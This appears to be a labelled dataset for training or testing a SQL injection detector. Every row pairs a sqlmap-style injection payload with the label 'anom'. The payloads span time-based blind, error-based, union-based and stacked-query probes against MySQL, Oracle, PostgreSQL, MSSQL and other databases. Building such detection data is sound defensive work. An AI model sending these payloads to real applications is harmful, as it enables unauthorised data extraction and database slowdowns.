payload,label
"1"") where 5298=5298 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--",anom
"1%""))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (((""%""=""",anom
"1""))) and (select * from (select(sleep(5)))fzno) and (((""jenb"" like ""jenb",anom
"1%"") rlike (select (case when (7736=7642) then 1 else 0x28 end)) and (""%""=""",anom
1'+(select 'rsgi' where 2258=2258;(select * from (select(sleep(5)))srmq))+',anom
1 waitfor delay '0:0:5'--,anom
"1'||(select 'nvrq' from dual where 4337=4337 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
-2658) as casi where 7364=7364 or 8245=9651--,anom
"1%"")) and elt(1210=1210,sleep(5)) and ((""%""=""",anom
"1"")) and 9198=9198--",anom
"1"";create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)",anom
"1')));select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",anom
"1%"" and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ""%""=""",anom
"1"") as uyms where 6210=6210 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",anom
"1%')) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (('%'='",anom
"-6548%"") union all select 6067,6067,6067,6067,6067,6067,6067,6067,6067--",anom
1;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,anom
-2891 where 1770=1770 or 9290=5866,anom
1')));begin user_lock.sleep(5); end and ((('hglq' like 'hglq,anom
"-4686"") as dxks where 7123=7123 or elt(1032=1032,3623)--",anom
"1"")) as qode where 2398=2398 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)--",anom
"1'||(select 'txyy' where 6500=6500 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1))||'",anom
1')) rlike (select (case when (3876=2077) then 1 else 0x28 end)) and (('hqcz' like 'hqcz,anom
"1')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('hpbt'='hpbt",anom
"1) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",anom
"1'||(select 'zdfo' from dual where 4288=4288 union all select null,null,null,null,null,null,null--",anom
"1"" or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""utzr"" like ""utzr",anom
"1')) as wves where 2641=2641 and 2388=benchmark(5000000,md5(0x6d457153))#",anom
"1"";select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",anom
-6190') where 2621=2621 or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)-,anom
"-6160'))) or make_set(1924=4415,4415) and ((('hayr'='hayr",anom
1' and (3423=7789)*7789 and 'pdia' like 'pdia,anom
1');select (case when (7096=2568) then 7096 else 1/(select 0) end)--,anom
-5020%') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('%'=',anom
"1' and elt(4249=4249,7259)",anom
"1))) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((8814=8814",anom
"1'))) or elt(6272=6272,sleep(5)) and ((('pded'='pded",anom
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('gmil'='gmil",anom
"1%"") or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (""%""=""",anom
1' and (3020=3020)*6703 and 'qsrz'='qsrz,anom
1'||(select 'ptkj' from dual where 6263=6263 union all select null--,anom
"1')) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (('vcph'='vcph",anom
"1)));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",anom
"1"") where 9855=9855;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",anom
"1"" and make_set(8403=8403,8899) and ""fqxr"" like ""fqxr",anom
1'))) and 9198=9198--,anom
"1,(select (case when (7711=7711) then 1 else 7711*(select 7711 from information_schema.character_sets) end))",anom
1'||(select 'exls' where 3837=3837 and sleep(5))||',anom
"1"" where 7249=7249 union all select null,null,null,null,null,null,null,null,null,null--",anom
"1'+(select kzgg where 5070=5070;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",anom
"1 where 3175=3175 or 8421=(select count(*) from generate_series(1,5000000))--",anom
1'||(select 'tfqg' from dual where 9862=9862 and (select * from (select(sleep(5)))gcrr)#,anom
"1') as tvqn where 2967=2967;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",anom
"1))) or 8466=benchmark(5000000,md5(0x694a4745)) and (((8671=8671",anom
-2516) where 3349=3349 or 4855=1806--,anom
"1%' or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and '%'='",anom
"1%"" and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ""%""=""",anom
"1))) union all select null,null,null,null#",anom
"1'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('dhqz'='dhqz",anom
"-1065)) union all select 7437,7437,7437,7437,7437,7437,7437,7437--",anom
"1%"" and make_set(2905=5725,5725) and ""%""=""",anom
"1%' and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and '%'='",anom
"1) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (5098=5098",anom
"1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('brlc'='brlc",anom
-1549') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('fnwx'='fnw,anom
"-4860') as azyx where 6901=6901 union all select 6901,6901,6901,6901,6901#",anom
"1%') union all select null,null#",anom
"1))) and 2388=benchmark(5000000,md5(0x6d457153))#",anom
"-1134 union all select 1297,1297,1297,1297,1297,1297,1297,1297,1297--",anom
"1"") where 3250=3250 union all select null#",anom
"-2423'))) union all select 8256,8256,8256,8256,8256,8256,8256,8256--",anom
"-1748%""))) union all select 2987#",anom
"1'+(select papc where 8900=8900 and elt(3114=3114,sleep(5))#",anom
"1)) as rwsn where 9946=9946 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",anom
"-3541"" or make_set(9354=9354,7185) and ""fgxu""=""fgxu",anom
1'+(select gguu where 7809=7809 union all select null--,anom
"-6680%"")) union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",anom
1') as svtm where 7627=7627 rlike (select * from (select(sleep(5)))sgvo)--,anom
"1'||(select 'jonh' from dual where 2415=2415 union all select null,null,null,null,null,null,null,null,null--",anom
"1%') or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
"1')))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((('sqnk'='sqnk",anom
"1"" and (7597=8422)*8422 and ""gywp"" like ""gywp",anom
"1'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('pufu' like 'pufu",anom
"1') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('cpfn' like 'cpfn",anom
1 and (3020=3020)*6703,anom
"1'||(select 'tezo' from dual where 4436=4436;select like('abcdefg',upper(hex(randomblob(500000000/2)))))||'",anom
"1)) as qfnu where 1609=1609 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",anom
-8056)) as botl where 9225=9225 or (1182=7641)*7641--,anom
"1'))) or elt(6272=6272,sleep(5)) and ((('ayjb' like 'ayjb",anom
"1) as iupg where 2861=2861 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",anom
"1) where 5598=5598 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",anom
"1'))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((('gmvk' like 'gmvk",anom
-2307'))) or 6872=6872 and ((('fyok' like 'fyok,anom
"1%') procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",anom
"-2639"") where 1494=1494 union all select 1494--",anom
1%' order by 1#,anom
"1""))) and elt(1210=1210,sleep(5)) and (((""felm""=""felm",anom
1') as fyib where 9246=9246;select (case when (5085=4259) then 5085 else 5085*(select 5085 from mysql.db) end)#,anom
"1) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",anom
1)) as bjxd where 4299=4299;select pg_sleep(5)--,anom
1) as tngy where 8956=8956 rlike (select (case when (7689=7689) then 1 else 0x28 end))--,anom
"1"" and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",anom
"-4300"") or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""klbu""=""klbu",anom
"1"") where 2278=2278;if(7899=7899) select 7899 else drop function zbbp--",anom
"1 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)# zwck",anom
"-8026 or elt(8434=4516,4516)# bsqo",anom
"1"")) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""vcjt"" like ""vcjt",anom
"-9263') as qodg where 6798=6798 or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",anom
-8341 or 8571=8571--,anom
1) as zzip where 5353=5353 and 3394=3092,anom
"1%"" and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ""%""=""",anom
1') rlike (select (case when (2721=8716) then 1 else 0x28 end)) and ('dumt'='dumt,anom
"1"")) or 8514=benchmark(5000000,md5(0x544d5a4c))#",anom
"1"")) as pqbs where 4409=4409;iif(1746=1730,1,1/0)",anom
1')));select (case when (1227=4014) then 1227 else 1227*(select 1227 from mysql.db) end)#,anom
"1"") where 2152=2152;select pg_sleep(5)--",anom
"1'||(select 'xyft' from dual where 8250=8250 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5))||'",anom
"1"")) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",anom
"1') as wpom where 2620=2620 and elt(3114=3114,sleep(5))#",anom
"1"")) as ftts where 3671=3671 and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",anom
"1"") where 5196=5196 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",anom
"-3819'))) union all select 9014,9014,9014,9014,9014,9014--",anom
1%' and (select * from (select(sleep(5)))gcrr)#,anom
"-6971"" or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""ifuh"" like ""ifuh",anom
"1%"") and elt(1210=1210,sleep(5)) and (""%""=""",anom
"1""))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((""htyi""=""htyi",anom
"1 where 6169=6169 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--",anom
"1') procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ('knhm'='knhm",anom
1')) as eymg where 7000=7000;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,anom
"1)) as somz where 1598=1598;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",anom
"1');create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)",anom
"1');select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ('yvbb'='yvbb",anom
"1"") where 8878=8878 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",anom
"1"") or 8514=benchmark(5000000,md5(0x544d5a4c))#",anom
"1)) union all select null,null,null,null,null,null#",anom
1') where 5307=5307;waitfor delay '0:0:5'--,anom
-8086%') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('%'=',anom
1'))) and 5615=5458--,anom
"1"")) order by 1#",anom
-4947' order by 1#,anom
"-4033')) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (('ouup'='ouup",anom
"1) and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (8529=8529",anom
"1%"" union all select null,null,null,null,null,null,null,null#",anom
1' where 2958=2958;if(6647=2179) select 6647 else drop function zvlq--,anom
"1' where 8360=8360 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",anom
"1%'));select count(*) from generate_series(1,5000000)--",anom
-8234'))) or 9323=9323#,anom
"1') where 5378=5378;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual--",anom
"-5798"" or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))",anom
1))) rlike (select (case when (4367=6879) then 1 else 0x28 end)) and (((2542=2542,anom
"1'))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((('bfrq' like 'bfrq",anom
"1%"") and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (""%""=""",anom
-4901) or 3407=6442#,anom
1 and (select * from (select(sleep(5)))gcrr)#,anom
"1%""))) and 9198=9198--",anom
"-1868)) union all select 1859,1859--",anom
1' and 2908=8067--,anom
"-4418"" or 6872=6872 and ""gbut""=""gbut",anom
"1"" where 4319=4319;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",anom
"1')) union all select null,null,null,null--",anom
1'||(select 'ytwz' from dual where 3025=3025 and (5039=5303)*5303)||',anom
"1%' or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",anom
"1""))) and 9198=9198--",anom
"iif(1539=1539,1539,1/0)",anom
"1' and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)",anom
"1%"")) and (3020=3020)*6703 and ((""%""=""",anom
"1%""))) rlike sleep(5)#",anom
"1'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('xwhi'='xwhi",anom
